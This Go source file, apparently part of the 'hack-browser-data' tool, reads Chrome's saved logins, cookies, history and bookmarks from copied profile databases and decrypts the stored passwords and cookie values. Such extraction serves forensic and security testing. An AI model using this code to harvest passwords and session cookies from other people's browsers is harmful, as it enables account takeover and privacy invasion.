package core

import (
	"database/sql"
	"hack-browser-data/log"
	"hack-browser-data/utils"
	"os"
	"sort"
	"time"

	_ "github.com/mattn/go-sqlite3"
	"github.com/tidwall/gjson"
)

const (
	Chrome = "Chrome"
	Safari = "Safari"
)

const (
	bookmarkID       = "id"
	bookmarkAdded    = "date_added"
	bookmarkUrl      = "url"
	bookmarkName     = "name"
	bookmarkType     = "type"
	bookmarkChildren = "children"
)

var (
	FullData = new(BrowserData)
)

type (
	BrowserData struct {
		BrowserName string
		LoginDataSlice
		BookmarkSlice
		CookieMap
		HistorySlice
	}
	LoginDataSlice []loginData
	BookmarkSlice  []bookmarks
	CookieMap      map[string][]cookies
	HistorySlice   []history
	loginData      struct {
		UserName    string
		encryptPass []byte
		Password    string
		LoginUrl    string
		CreateDate  time.Time
	}
	bookmarks struct {
		ID        int64
		DateAdded time.Time
		URL       string
		Name      string
		Type      string
	}
	cookies struct {
		KeyName      string
		encryptValue []byte
		Value        string
		Host         string
		Path         string
		IsSecure     bool
		IsHTTPOnly   bool
		HasExpire    bool
		IsPersistent bool
		CreateDate   time.Time
		ExpireDate   time.Time
	}
	history struct {
		Url           string
		Title         string
		VisitCount    int
		LastVisitTime time.Time
	}
)

func ChromeDB(dbname string) {
	switch dbname {
	case utils.LoginData:
		parseLogin()
	case utils.Bookmarks:
		parseBookmarks()
	case utils.Cookies:
		parseCookie()
	case utils.History:
		parseHistory()
	}
}

var bookmarkList BookmarkSlice

func parseBookmarks() {
	bookmarks, err := utils.ReadFile(utils.Bookmarks)
	defer os.Remove(utils.Bookmarks)
	if err != nil {
		log.Println(err)
	}
	r := gjson.Parse(bookmarks)
	if r.Exists() {
		roots := r.Get("roots")
		roots.ForEach(func(key, value gjson.Result) bool {
			getBookmarkChildren(value)
			return true
		})
	}
	sort.Slice(bookmarkList, func(i, j int) bool {
		return bookmarkList[i].ID < bookmarkList[j].ID
	})
	FullData.BookmarkSlice = bookmarkList
}

var queryLogin = `SELECT origin_url, username_value, password_value, date_created FROM logins`

func parseLogin() {
	var loginItemList LoginDataSlice
	login := loginData{}
	loginDB, err := sql.Open("sqlite3", utils.LoginData)
	defer os.Remove(utils.LoginData)
	defer func() {
		if err := loginDB.Close(); err != nil {
			log.Println(err)
		}
	}()
	if err != nil {
		log.Println(err)
	}
	err = loginDB.Ping()
	rows, err := loginDB.Query(queryLogin)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Println(err)
		}
	}()
	for rows.Next() {
		var (
			url, username, password string
			pwd                     []byte
			create                  int64
		)
		err = rows.Scan(&url, &username, &pwd, &create)
		login = loginData{
			UserName:    username,
			encryptPass: pwd,
			LoginUrl:    url,
			CreateDate:  utils.TimeEpochFormat(create),
		}
		password, err = utils.DecryptChromePass(pwd)
		login.Password = password
		if err != nil {
			log.Println(err)
		}
		loginItemList = append(loginItemList, login)
	}
	sort.Sort(loginItemList)
	FullData.LoginDataSlice = loginItemList
}

var queryCookie = `SELECT name, encrypted_value, host_key, path, creation_utc, expires_utc, is_secure, is_httponly, has_expires, is_persistent FROM cookies`

func parseCookie() {
	cookie := cookies{}
	cookieMap := make(map[string][]cookies)
	cookieDB, err := sql.Open("sqlite3", utils.Cookies)
	defer os.Remove(utils.Cookies)
	defer func() {
		if err := cookieDB.Close(); err != nil {
			log.Println(err)
		}
	}()
	if err != nil {
		log.Println(err)
	}
	err = cookieDB.Ping()
	rows, err := cookieDB.Query(queryCookie)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Println(err)
		}
	}()
	for rows.Next() {
		var (
			key, host, path, value                        string
			isSecure, isHTTPOnly, hasExpire, isPersistent int
			createDate, expireDate                        int64
			encryptValue                                  []byte
		)
		err = rows.Scan(&key, &encryptValue, &host, &path, &createDate, &expireDate, &isSecure, &isHTTPOnly, &hasExpire, &isPersistent)
		cookie = cookies{
			KeyName:      key,
			Host:         host,
			Path:         path,
			encryptValue: encryptValue,
			IsSecure:     utils.IntToBool(isSecure),
			IsHTTPOnly:   utils.IntToBool(isHTTPOnly),
			HasExpire:    utils.IntToBool(hasExpire),
			IsPersistent: utils.IntToBool(isPersistent),
			CreateDate:   utils.TimeEpochFormat(createDate),
			ExpireDate:   utils.TimeEpochFormat(expireDate),
		}
		// remove prefix 'v10'
		value, err = utils.DecryptChromePass(encryptValue)
		cookie.Value = value
		if _, ok := cookieMap[host]; ok {
			cookieMap[host] = append(cookieMap[host], cookie)
		} else {
			cookieMap[host] = []cookies{cookie}
		}
	}
	FullData.CookieMap = cookieMap
}

var queryHistory = `SELECT url, title, visit_count, last_visit_time FROM urls`

func parseHistory() {
	var historyList HistorySlice
	h := history{}
	historyDB, err := sql.Open("sqlite3", utils.History)
	defer os.Remove(utils.History)
	defer func() {
		if err := historyDB.Close(); err != nil {
			log.Println(err)
		}
	}()
	if err != nil {
		log.Println(err)
	}
	err = historyDB.Ping()
	rows, err := historyDB.Query(queryHistory)
	defer func() {
		if err := rows.Close(); err != nil {
			log.Println(err)
		}
	}()
	for rows.Next() {
		var (
			url, title    string
			visitCount    int
			lastVisitTime int64
		)
		err := rows.Scan(&url, &title, &visitCount, &lastVisitTime)
		h = history{
			Url:           url,
			Title:         title,
			VisitCount:    visitCount,
			LastVisitTime: utils.TimeEpochFormat(lastVisitTime),
		}
		if err != nil {
			log.Println(err)
			continue
		}
		historyList = append(historyList, h)
	}
	sort.Slice(historyList, func(i, j int) bool {
		return historyList[i].VisitCount > historyList[j].VisitCount
	})
	FullData.HistorySlice = historyList
}

func getBookmarkChildren(value gjson.Result) (children gjson.Result) {
	b := bookmarks{}
	b.ID = value.Get(bookmarkID).Int()
	nodeType := value.Get(bookmarkType)
	b.DateAdded = utils.TimeEpochFormat(value.Get(bookmarkAdded).Int())
	b.URL = value.Get(bookmarkUrl).String()
	b.Name = value.Get(bookmarkName).String()
	children = value.Get(bookmarkChildren)
	if nodeType.Exists() {
		b.Type = nodeType.String()
		bookmarkList = append(bookmarkList, b)
		if children.Exists() && children.IsArray() {
			for _, v := range children.Array() {
				children = getBookmarkChildren(v)
			}
		}
	}
	return children
}
